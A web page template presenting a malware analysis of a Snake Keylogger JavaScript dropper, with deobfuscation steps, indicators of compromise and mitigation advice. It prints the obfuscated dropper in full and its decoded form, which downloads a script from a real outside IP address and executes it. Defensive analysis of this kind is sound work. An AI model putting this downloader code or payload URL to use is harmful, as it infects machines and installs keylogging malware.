@extends('layouts.app')

@section('title', 'Snake Keylogger Analysis - Nexus')

@section('content')
<div class="min-h-screen bg-gray-900 text-white">
    <!-- Header -->
    <div class="bg-gradient-to-r from-red-900 to-orange-900 py-16">
        <div class="container mx-auto px-4 text-center">
            <h1 class="text-5xl font-bold mb-4">
                <i class="fas fa-snake mr-3 text-red-400"></i>
                Snake Keylogger Analysis
            </h1>
            <p class="text-xl text-red-200">Real-world JavaScript malware analysis and deobfuscation techniques</p>
            <div class="mt-6 flex justify-center space-x-4">
                <span class="bg-red-600 px-3 py-1 rounded-full text-sm">Active Threat</span>
                <span class="bg-orange-600 px-3 py-1 rounded-full text-sm">JavaScript Dropper</span>
                <span class="bg-yellow-600 px-3 py-1 rounded-full text-sm">Obfuscated</span>
            </div>
        </div>
    </div>

    <!-- Navigation -->
    <nav class="bg-gray-800 py-4 sticky top-0 z-50">
        <div class="container mx-auto px-4">
            <div class="flex justify-center space-x-8 text-sm md:text-base">
                <a href="#overview" class="hover:text-red-400 transition-colors">Overview</a>
                <a href="#initial-code" class="hover:text-red-400 transition-colors">Initial Code</a>
                <a href="#deobfuscation" class="hover:text-red-400 transition-colors">Deobfuscation</a>
                <a href="#technical-analysis" class="hover:text-red-400 transition-colors">Technical Analysis</a>
                <a href="#execution-flow" class="hover:text-red-400 transition-colors">Execution Flow</a>
                <a href="#iocs" class="hover:text-red-400 transition-colors">IOCs & Mitigation</a>
            </div>
        </div>
    </nav>

    <!-- Main Content -->
    <div class="container mx-auto px-4 py-8">

        <!-- Overview Section -->
        <section id="overview" class="mb-16">
            <div class="bg-gray-800 rounded-lg p-8">
                <h2 class="text-3xl font-bold mb-6 flex items-center">
                    <i class="fas fa-info-circle mr-3 text-blue-400"></i>
                    Executive Summary
                </h2>
                <div class="grid md:grid-cols-2 gap-8">
                    <div>
                        <h3 class="text-xl font-semibold mb-4 text-red-400">Threat Classification</h3>
                        <ul class="space-y-2 text-gray-300">
                            <li><strong>Type:</strong> JavaScript Malware Dropper</li>
                            <li><strong>Family:</strong> Snake Keylogger</li>
                            <li><strong>Obfuscation:</strong> String.fromCharCode() + Mathematical Operations</li>
                            <li><strong>Target:</strong> Windows Systems (Internet Explorer/WScript)</li>
                            <li><strong>Persistence:</strong> System Directory File Creation</li>
                        </ul>
                    </div>
                    <div>
                        <h3 class="text-xl font-semibold mb-4 text-orange-400">Attack Vector</h3>
                        <ul class="space-y-2 text-gray-300">
                            <li><strong>Delivery:</strong> Malicious JavaScript/JScript files</li>
                            <li><strong>Execution:</strong> ActiveX objects (WScript.Shell, MSXML2)</li>
                            <li><strong>Payload:</strong> Downloads additional malware from C2</li>
                            <li><strong>Persistence:</strong> Creates WindowsAudio.js in system folder</li>
                        </ul>
                    </div>
                </div>
            </div>
        </section>

        <!-- Initial Code Analysis -->
        <section id="initial-code" class="mb-16">
            <div class="bg-gray-800 rounded-lg p-8">
                <h2 class="text-3xl font-bold mb-6 flex items-center">
                    <i class="fas fa-code mr-3 text-green-400"></i>
                    Initial Code Analysis
                </h2>
                
                <!-- Screenshot 1 -->
                <div class="mb-8">
                    <img src="{{ asset('images/snake_keylogger/s1.png') }}" alt="Initial Code Analysis" class="w-full rounded-lg border border-gray-600">
                    <p class="text-sm text-gray-400 mt-2 text-center">Figure 1: Initial obfuscated JavaScript code sample</p>
                </div>

                <div class="bg-gray-900 rounded-lg p-6 mb-6">
                    <h3 class="text-xl font-semibold mb-4 text-red-400">Original Obfuscated Code</h3>
                    <pre class="text-xs overflow-x-auto bg-black p-4 rounded border text-green-400"><code>var I0i=64562877
var LEZVCW = String.fromCharCode(64562993-I0i,64562991-I0i,64562998-I0i,64563000-I0i,64562887-I0i,64562995-I0i,64562974-I0i,64562991-I0i,64562909-I0i,64562956-I0i,64562975-I0i,64562983-I0i,64562978-I0i,64562976-I0i,64562993-I0i,64562909-I0i,64562938-I0i,64562909-I0i,64562987-I0i,64562978-I0i,64562996-I0i,64562909-I0i,64562942-I0i,64562976-I0i,64562993-I0i,64562982-I0i,64562995-I0i,64562978-I0i,64562965-I0i,64562956-I0i,64562975-I0i,64562983-I0i,64562978-I0i,64562976-I0i,64562993-I0i,64562917-I0i,64562911-I0i,64562954-I0i,64562960-I0i,64562965-I0i,64562954-I0i,64562953-I0i,64562927-I0i,64562923-I0i,64562965-I0i,64562954-I0i,64562953-I0i,64562949-I0i,64562961-I0i,64562961-I0i,64562957-I0i,64562911-I0i,64562918-I0i,64562936-I0i,64562887-I0i,64562956-I0i,64562975-I0i,64562983-I0i,64562978-I0i,64562976-I0i,64562993-I0i,64562923-I0i,64562956-I0i,64562989-I0i,64562978-I0i,64562987-I0i,64562917-I0i,64562911-I0i,64562948-I0i,64562946-I0i,64562961-I0i,64562911-I0i,64562921-I0i,64562909-I0i,64562911-I0i,64562981-I0i,64562993-I0i,64562993-I0i,64562989-I0i,64562935-I0i,64562924-I0i,64562924-I0i,64562926-I0i,64562934-I0i,64562927-I0i,64562923-I0i,64562928-I0i,64562923-I0i,64562927-I0i,64562927-I0i,64562925-I0i,64562923-I0i,64562931-I0i,64562924-I0i,64562996-I0i,64562978-I0i,64562975-I0i,64562924-I0i,64562996-I0i,64562933-I0i,64562933-I0i,64562923-I0i,64562983-I0i,64562992-I0i,64562911-I0i,64562921-I0i,64562909-I0i,64562979-I0i,64562974-I0i,64562985-I0i,64562992-I0i,64562978-I0i,64562918-I0i,64562936-I0i)
eval(LEZVCW)</code></pre>
                </div>

                <div class="grid md:grid-cols-2 gap-6">
                    <div class="bg-gray-900 rounded-lg p-6">
                        <h4 class="text-lg font-semibold mb-3 text-yellow-400">Key Observations</h4>
                        <ul class="space-y-2 text-gray-300">
                            <li>• Base value: <code class="text-green-400">I0i = 64562877</code></li>
                            <li>• String construction via arithmetic operations</li>
                            <li>• Dynamic code execution with <code class="text-red-400">eval()</code></li>
                            <li>• Obfuscated through character code manipulation</li>
                        </ul>
                    </div>
                    <div class="bg-gray-900 rounded-lg p-6">
                        <h4 class="text-lg font-semibold mb-3 text-blue-400">Analysis Approach</h4>
                        <ul class="space-y-2 text-gray-300">
                            <li>• Calculate each arithmetic operation</li>
                            <li>• Convert results to ASCII characters</li>
                            <li>• Reconstruct the obfuscated code</li>
                            <li>• Analyze the revealed functionality</li>
                        </ul>
                    </div>
                </div>
            </div>
        </section>

        <!-- Deobfuscation Process -->
        <section id="deobfuscation" class="mb-16">
            <div class="bg-gray-800 rounded-lg p-8">
                <h2 class="text-3xl font-bold mb-6 flex items-center">
                    <i class="fas fa-unlock mr-3 text-yellow-400"></i>
                    Deobfuscation Process
                </h2>

                <!-- Screenshot 2 -->
                <div class="mb-8">
                    <img src="{{ asset('images/snake_keylogger/s2.png') }}" alt="Deobfuscation Process" class="w-full rounded-lg border border-gray-600">
                    <p class="text-sm text-gray-400 mt-2 text-center">Figure 2: Step-by-step deobfuscation process</p>
                </div>

                <div class="space-y-6">
                    <div class="bg-gray-900 rounded-lg p-6">
                        <h3 class="text-xl font-semibold mb-4 text-yellow-400">Step 1: Mathematical Decoding</h3>
                        <p class="text-gray-300 mb-4">Converting String.fromCharCode() operations to ASCII characters:</p>
                        <div class="bg-black p-4 rounded font-mono text-sm overflow-x-auto">
                            <div class="text-green-400">64562993 - 64562877 = 116 → 't'</div>
                            <div class="text-green-400">64562991 - 64562877 = 114 → 'r'</div>
                            <div class="text-green-400">64562998 - 64562877 = 121 → 'y'</div>
                            <div class="text-green-400">64563000 - 64562877 = 123 → '{'</div>
                            <div class="text-gray-400">... (continuing pattern)</div>
                        </div>
                    </div>

                    <div class="bg-gray-900 rounded-lg p-6">
                        <h3 class="text-xl font-semibold mb-4 text-blue-400">Step 2: Revealed Code Structure</h3>
                        <p class="text-gray-300 mb-4">After deobfuscation, the code reveals its true purpose:</p>
                        <pre class="bg-black p-4 rounded text-green-400 text-sm overflow-x-auto"><code>try {
    var Object = new ActiveXObject("MSXML2.XMLHTTP");
    Object.Open("GET", "http://192.3.220.6/web/w88.js", false);
    Object.Send();
    var fso = new ActiveXObject("Scripting.FileSystemObject");
    var filepath = fso.GetSpecialFolder(2) + "/OPXCFY.js";
    if (Object.Status == 200) {
        var Stream = new ActiveXObject("ADODB.Stream");
        Stream.Open();
        Stream.Type = 1;
        Stream.Write(Object.ResponseBody);
        Stream.Position = 0;
        Stream.SaveToFile(filepath, 2);
        Stream.Close();
        var WshShell = new ActiveXObject("WScript.Shell");
        var oRUN = WshShell.Run(filepath);
    }
} catch (e) {}</code></pre>
                    </div>
                </div>
            </div>
        </section>

        <!-- Technical Analysis -->
        <section id="technical-analysis" class="mb-16">
            <div class="bg-gray-800 rounded-lg p-8">
                <h2 class="text-3xl font-bold mb-6 flex items-center">
                    <i class="fas fa-microscope mr-3 text-purple-400"></i>
                    Technical Analysis
                </h2>

                <!-- Screenshot 3 -->
                <div class="mb-8">
                    <img src="{{ asset('images/snake_keylogger/s3.png') }}" alt="Function Translation" class="w-full rounded-lg border border-gray-600">
                    <p class="text-sm text-gray-400 mt-2 text-center">Figure 3: Advanced obfuscation patterns and function analysis</p>
                </div>

                <div class="grid md:grid-cols-2 gap-8">
                    <div class="bg-gray-900 rounded-lg p-6">
                        <h3 class="text-xl font-semibold mb-4 text-red-400">ActiveX Object Usage</h3>
                        <div class="space-y-4">
                            <div>
                                <h4 class="font-semibold text-orange-400">MSXML2.XMLHTTP</h4>
                                <p class="text-gray-300 text-sm">Downloads malicious payload from C2 server</p>
                                <code class="block bg-black p-2 rounded mt-2 text-green-400 text-xs">
                                    http://192.3.220.6/web/w88.js
                                </code>
                            </div>
                            <div>
                                <h4 class="font-semibold text-orange-400">Scripting.FileSystemObject</h4>
                                <p class="text-gray-300 text-sm">Accesses system folders and creates persistent files</p>
                                <code class="block bg-black p-2 rounded mt-2 text-green-400 text-xs">
                                    GetSpecialFolder(2) → System32 directory
                                </code>
                            </div>
                            <div>
                                <h4 class="font-semibold text-orange-400">ADODB.Stream</h4>
                                <p class="text-gray-300 text-sm">Handles binary file operations for payload storage</p>
                            </div>
                            <div>
                                <h4 class="font-semibold text-orange-400">WScript.Shell</h4>
                                <p class="text-gray-300 text-sm">Executes the downloaded malicious payload</p>
                            </div>
                        </div>
                    </div>

                    <div class="bg-gray-900 rounded-lg p-6">
                        <h3 class="text-xl font-semibold mb-4 text-blue-400">Advanced Obfuscation Techniques</h3>
                        <div class="space-y-4">
                            <div>
                                <h4 class="font-semibold text-yellow-400">Multi-Layer String Obfuscation</h4>
                                <pre class="bg-black p-2 rounded mt-2 text-green-400 text-xs overflow-x-auto"><code>// Original pattern
String.fromCharCode(475-383) + 
String.fromCharCode(90-3) + 
String.fromCharCode(474-369)

// Resolves to
"\\WindowsAudio.js"</code></pre>
                            </div>
                            <div>
                                <h4 class="font-semibold text-yellow-400">Variable Name Randomization</h4>
                                <p class="text-gray-300 text-sm">Extremely long, random variable names to confuse analysis</p>
                                <code class="block bg-black p-2 rounded mt-2 text-green-400 text-xs">
                                    GzCMjpDjYhhYWHHThilDQVeGymbJltUvtlUrnp
                                </code>
                            </div>
                            <div>
                                <h4 class="font-semibold text-yellow-400">Code Noise Injection</h4>
                                <p class="text-gray-300 text-sm">Thousands of lines of commented random strings</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <!-- Execution Flow -->
        <section id="execution-flow" class="mb-16">
            <div class="bg-gray-800 rounded-lg p-8">
                <h2 class="text-3xl font-bold mb-6 flex items-center">
                    <i class="fas fa-sitemap mr-3 text-cyan-400"></i>
                    Execution Flow Analysis
                </h2>

                <!-- Screenshot 4 -->
                <div class="mb-8">
                    <img src="{{ asset('images/snake_keylogger/s4.png') }}" alt="Final Analysis" class="w-full rounded-lg border border-gray-600">
                    <p class="text-sm text-gray-400 mt-2 text-center">Figure 4: Complete execution flow and final analysis results</p>
                </div>

                <div class="bg-gray-900 rounded-lg p-6">
                    <h3 class="text-xl font-semibold mb-6 text-cyan-400">Attack Chain Breakdown</h3>
                    <div class="space-y-6">
                        <div class="flex items-start space-x-4">
                            <div class="bg-red-600 text-white rounded-full w-8 h-8 flex items-center justify-center font-bold">1</div>
                            <div>
                                <h4 class="font-semibold text-white">Initial Execution</h4>
                                <p class="text-gray-300">JavaScript file executed via browser or WScript host</p>
                                <code class="block bg-black p-2 rounded mt-2 text-green-400 text-xs">eval(LEZVCW) // Deobfuscated malicious code</code>
                            </div>
                        </div>

                        <div class="flex items-start space-x-4">
                            <div class="bg-orange-600 text-white rounded-full w-8 h-8 flex items-center justify-center font-bold">2</div>
                            <div>
                                <h4 class="font-semibold text-white">C2 Communication</h4>
                                <p class="text-gray-300">Downloads secondary payload from remote server</p>
                                <code class="block bg-black p-2 rounded mt-2 text-green-400 text-xs">GET http://192.3.220.6/web/w88.js</code>
                            </div>
                        </div>

                        <div class="flex items-start space-x-4">
                            <div class="bg-yellow-600 text-white rounded-full w-8 h-8 flex items-center justify-center font-bold">3</div>
                            <div>
                                <h4 class="font-semibold text-white">Persistence Establishment</h4>
                                <p class="text-gray-300">Creates malicious file in system directory</p>
                                <code class="block bg-black p-2 rounded mt-2 text-green-400 text-xs">C:\Windows\System32\OPXCFY.js</code>
                            </div>
                        </div>

                        <div class="flex items-start space-x-4">
                            <div class="bg-green-600 text-white rounded-full w-8 h-8 flex items-center justify-center font-bold">4</div>
                            <div>
                                <h4 class="font-semibold text-white">Payload Execution</h4>
                                <p class="text-gray-300">Executes downloaded malware for keylogging activities</p>
                                <code class="block bg-black p-2 rounded mt-2 text-green-400 text-xs">WshShell.Run(filepath)</code>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="mt-8 bg-gray-900 rounded-lg p-6">
                    <h3 class="text-xl font-semibold mb-4 text-purple-400">Advanced Function Analysis</h3>
                    <p class="text-gray-300 mb-4">The malware includes sophisticated base64 decoding mechanisms:</p>
                    <pre class="bg-black p-4 rounded text-green-400 text-sm overflow-x-auto"><code>function processData(inputText) {
    // Creates XML Document Object for base64 decoding
    const xmlDoc = new ActiveXObject("Msxml2.DOMDocument");
    const element = xmlDoc.createElement("tmp");
    
    // Sets binary base64 dataType for automatic decoding
    element.dataType = "bin.base64";
    element.text = inputText;
    
    // Returns decoded binary data
    return element.nodeTypedValue;
}</code></pre>
                </div>
            </div>
        </section>

        <!-- IOCs and Mitigation -->
        <section id="iocs" class="mb-16">
            <div class="bg-gray-800 rounded-lg p-8">
                <h2 class="text-3xl font-bold mb-6 flex items-center">
                    <i class="fas fa-shield-alt mr-3 text-green-400"></i>
                    Indicators of Compromise & Mitigation
                </h2>

                <div class="grid md:grid-cols-2 gap-8">
                    <div class="bg-red-900 bg-opacity-30 rounded-lg p-6 border border-red-600">
                        <h3 class="text-xl font-semibold mb-4 text-red-400">Indicators of Compromise</h3>
                        <div class="space-y-4">
                            <div>
                                <h4 class="font-semibold text-orange-400">Network IOCs</h4>
                                <ul class="text-gray-300 text-sm space-y-1 mt-2">
                                    <li>• <code class="text-red-400">192.3.220.6</code> - C2 Server IP</li>
                                    <li>• <code class="text-red-400">http://192.3.220.6/web/w88.js</code> - Payload URL</li>
                                    <li>• HTTP GET requests to suspicious domains</li>
                                </ul>
                            </div>
                            <div>
                                <h4 class="font-semibold text-orange-400">File System IOCs</h4>
                                <ul class="text-gray-300 text-sm space-y-1 mt-2">
                                    <li>• <code class="text-red-400">%SYSTEM32%\OPXCFY.js</code></li>
                                    <li>• <code class="text-red-400">%SYSTEM32%\WindowsAudio.js</code></li>
                                    <li>• Suspicious .js files in system directories</li>
                                </ul>
                            </div>
                            <div>
                                <h4 class="font-semibold text-orange-400">Process IOCs</h4>
                                <ul class="text-gray-300 text-sm space-y-1 mt-2">
                                    <li>• WScript.exe spawning suspicious processes</li>
                                    <li>• ActiveX object creation from JavaScript</li>
                                    <li>• Unusual network connections from script hosts</li>
                                </ul>
                            </div>
                        </div>
                    </div>

                    <div class="bg-green-900 bg-opacity-30 rounded-lg p-6 border border-green-600">
                        <h3 class="text-xl font-semibold mb-4 text-green-400">Mitigation Strategies</h3>
                        <div class="space-y-4">
                            <div>
                                <h4 class="font-semibold text-blue-400">Preventive Measures</h4>
                                <ul class="text-gray-300 text-sm space-y-1 mt-2">
                                    <li>• Disable WScript.exe and CScript.exe</li>
                                    <li>• Block ActiveX controls in browsers</li>
                                    <li>• Implement application whitelisting</li>
                                    <li>• Use modern browsers with sandboxing</li>
                                </ul>
                            </div>
                            <div>
                                <h4 class="font-semibold text-blue-400">Detection Controls</h4>
                                <ul class="text-gray-300 text-sm space-y-1 mt-2">
                                    <li>• Monitor for WScript/CScript execution</li>
                                    <li>• Alert on ActiveX object creation</li>
                                    <li>• Network monitoring for C2 domains</li>
                                    <li>• File integrity monitoring</li>
                                </ul>
                            </div>
                            <div>
                                <h4 class="font-semibold text-blue-400">Response Actions</h4>
                                <ul class="text-gray-300 text-sm space-y-1 mt-2">
                                    <li>• Isolate affected systems immediately</li>
                                    <li>• Remove malicious files from system directories</li>
                                    <li>• Reset user credentials</li>
                                    <li>• Scan for additional compromise</li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="mt-8 bg-yellow-900 bg-opacity-30 rounded-lg p-6 border border-yellow-600">
                    <h3 class="text-xl font-semibold mb-4 text-yellow-400">
                        <i class="fas fa-exclamation-triangle mr-2"></i>
                        Security Recommendations
                    </h3>
                    <div class="grid md:grid-cols-3 gap-6 text-sm">
                        <div>
                            <h4 class="font-semibold text-white mb-2">Immediate Actions</h4>
                            <ul class="text-gray-300 space-y-1">
                                <li>• Block the C2 IP address</li>
                                <li>• Scan all systems for IOCs</li>
                                <li>• Update antivirus signatures</li>
                            </ul>
                        </div>
                        <div>
                            <h4 class="font-semibold text-white mb-2">Long-term Security</h4>
                            <ul class="text-gray-300 space-y-1">
                                <li>• Implement zero-trust architecture</li>
                                <li>• Regular security awareness training</li>
                                <li>• Endpoint detection and response (EDR)</li>
                            </ul>
                        </div>
                        <div>
                            <h4 class="font-semibold text-white mb-2">Monitoring</h4>
                            <ul class="text-gray-300 space-y-1">
                                <li>• Continuous network monitoring</li>
                                <li>• Behavioral analysis systems</li>
                                <li>• Regular threat hunting exercises</li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <!-- Conclusion -->
        <section class="mb-16">
            <div class="bg-gradient-to-r from-gray-800 to-gray-900 rounded-lg p-8 border border-gray-600">
                <h2 class="text-3xl font-bold mb-6 text-center">
                    <i class="fas fa-graduation-cap mr-3 text-purple-400"></i>
                    Key Takeaways
                </h2>
                <div class="grid md:grid-cols-2 gap-8">
                    <div>
                        <h3 class="text-xl font-semibold mb-4 text-blue-400">Analysis Insights</h3>
                        <ul class="space-y-2 text-gray-300">
                            <li>• Multi-layer obfuscation can be systematically defeated</li>
                            <li>• Mathematical operations are common in JavaScript malware</li>
                            <li>• ActiveX objects provide powerful system access</li>
                            <li>• String.fromCharCode() is a reliable obfuscation indicator</li>
                        </ul>
                    </div>
                    <div>
                        <h3 class="text-xl font-semibold mb-4 text-green-400">Security Lessons</h3>
                        <ul class="space-y-2 text-gray-300">
                            <li>• Legacy technologies pose significant security risks</li>
                            <li>• Dynamic code execution should be strictly controlled</li>
                            <li>• Network monitoring is crucial for C2 detection</li>
                            <li>• User education prevents initial compromise</li>
                        </ul>
                    </div>
                </div>
            </div>
        </section>

    </div>

    <!-- Back to Top -->
    <button onclick="window.scrollTo({top: 0, behavior: 'smooth'})" 
            class="fixed bottom-6 right-6 bg-red-600 hover:bg-red-700 text-white p-3 rounded-full shadow-lg transition-colors">
        <i class="fas fa-arrow-up"></i>
    </button>
</div>

<script>
// Smooth scrolling for navigation links
document.querySelectorAll('nav a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function (e) {
        e.preventDefault();
        const target = document.querySelector(this.getAttribute('href'));
        if (target) {
            target.scrollIntoView({
                behavior: 'smooth',
                block: 'start'
            });
        }
    });
});

// Highlight current section in navigation
window.addEventListener('scroll', () => {
    const sections = document.querySelectorAll('section[id]');
    const navLinks = document.querySelectorAll('nav a[href^="#"]');
    
    let current = '';
    sections.forEach(section => {
        const sectionTop = section.offsetTop;
        const sectionHeight = section.clientHeight;
        if (window.pageYOffset >= sectionTop - 200) {
            current = section.getAttribute('id');
        }
    });

    navLinks.forEach(link => {
        link.classList.remove('text-red-400');
        if (link.getAttribute('href') === `#${current}`) {
            link.classList.add('text-red-400');
        }
    });
});
</script>
@endsection